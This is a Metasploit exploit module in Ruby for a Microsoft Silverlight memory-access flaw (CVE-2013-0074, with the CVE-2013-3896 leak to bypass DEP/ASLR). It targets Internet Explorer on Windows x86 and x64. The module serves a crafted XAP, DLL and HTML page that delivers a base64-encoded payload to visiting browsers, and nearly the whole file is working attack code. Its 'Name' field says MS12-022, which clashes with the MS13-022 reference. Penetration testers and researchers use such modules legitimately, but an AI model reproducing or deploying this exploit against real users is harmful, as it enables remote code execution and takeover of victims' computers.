##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  MANIFEST = <<-EOS
<Deployment xmlns="http://schemas.microsoft.com/client/2007/deployment" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" EntryPointAssembly="SilverApp1" EntryPointType="SilverApp1.App" RuntimeVersion="4.0.50826.0">
  <Deployment.Parts>
    <AssemblyPart x:Name="SilverApp1" Source="SilverApp1.dll" />
  </Deployment.Parts>
</Deployment>
  EOS

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS12-022 Microsoft Internet Explorer COALineDashStyleArray Unsafe Memory Access",
      'Description'    => %q{
        This module exploits a vulnerability on Microsoft Silverlight. The vulnerability exists on
        the Initialize() method from System.Windows.Browser.ScriptObject, which access memory in an
        unsafe manner. Since it is accessible for untrusted code (user controlled) it's possible
        to dereference arbitrary memory which easily leverages to arbitrary code execution. In order
        to bypass DEP/ASLR a second vulnerability is used, in the public WriteableBitmap class
        from System.Windows.dll. This module has been tested successfully on IE6 - IE10, Windows XP
        SP3 / Windows 7 SP1 on both x32 and x64 architectures.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'James Forshaw',   # RCE Vulnerability discovery
          'Vitaliy Toropov', # Info Leak discovery, original exploit, all the hard work
          'juan vazquez'     # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-0074' ],
          [ 'CVE', '2013-3896' ],
          [ 'OSVDB', '91147' ],
          [ 'OSVDB', '98223' ],
          [ 'BID', '58327' ],
          [ 'BID', '62793' ],
          [ 'MSB', 'MS13-022' ],
          [ 'MSB', 'MS13-087' ],
          [ 'URL', 'http://packetstormsecurity.com/files/123731/' ]
        ],
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f',
          'EXITFUNC'             => 'thread'
        },
      'Platform'       => 'win',
      'Arch'           => [ARCH_X86, ARCH_X86_64],
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :os_name => Msf::OperatingSystems::WINDOWS,
          :ua_name => Msf::HttpClients::IE
        },
      'Targets'        =>
        [
          [ 'Windows x86',
            {
              'arch'      => ARCH_X86
            }
          ],
          [ 'Windows x64',
            {
              'arch'      => ARCH_X86_64
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Mar 12 2013",
      'DefaultTarget'  => 0))

  end

  def setup
    @xap_name = "#{rand_text_alpha(5 + rand(5))}.xap"
    @dll_name = "#{rand_text_alpha(5 + rand(5))}.dll"
    File.open(File.join( Msf::Config.data_directory, "exploits", "cve-2013-0074", "SilverApp1.xap" ), "rb") { |f| @xap = f.read }
    File.open(File.join( Msf::Config.data_directory, "exploits", "cve-2013-0074", "SilverApp1.dll" ), "rb") { |f| @dll = f.read }
    @xaml = MANIFEST.gsub(/SilverApp1\.dll/, @dll_name)
    super
  end

  def exploit_template(cli, target_info)

    my_payload = get_payload(cli, target_info)

    # Align to 4 bytes the x86 payload
    if target_info[:arch] == ARCH_X86
      while my_payload.length % 4 != 0
        my_payload = "\x90" + my_payload
      end
    end

    my_payload = Rex::Text.encode_base64(my_payload)

    html_template = <<-EOF
<html>
<!-- saved from url=(0014)about:internet -->
<head>
  <title>Silverlight Application</title>
  <style type="text/css">
    html, body { height: 100%; overflow: auto; }
    body { padding: 0; margin: 0; }
    #form1 { height: 99%; }
    #silverlightControlHost { text-align:center; }
  </style>
</head>
<body>
  <form id="form1" runat="server" >
    <div id="silverlightControlHost">
    <object data="data:application/x-silverlight-2," type="application/x-silverlight-2" width="100%" height="100%">
      <param name="source" value="<%= @xap_name %>"/>
      <param name="background" value="white" />
      <param name="InitParams" value="payload=<%= my_payload %>" />
    </object>
    </div>
  </form>
</body>
</html>
EOF

    return html_template, binding()
  end

  def on_request_exploit(cli, request, target_info)
    print_status("request: #{request.uri}")
    if request.uri =~ /#{@xap_name}$/
      print_status("Sending XAP...")
      send_response(cli, @xap, { 'Content-Type' => 'application/x-silverlight-2', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache' })
    elsif request.uri =~ /#{@dll_name}$/
      print_status("Sending DLL...")
      send_response(cli, @dll, { 'Content-Type' => 'application/octect-stream', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache' })
    elsif request.uri =~ /AppManifest.xaml$/
      print_status("Sending XAML...")
      send_response(cli, @xaml, { 'Content-Type' => 'text/xaml', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache' })
    else
      print_status("Sending HTML...")
      send_exploit_html(cli, exploit_template(cli, target_info))
    end
  end

end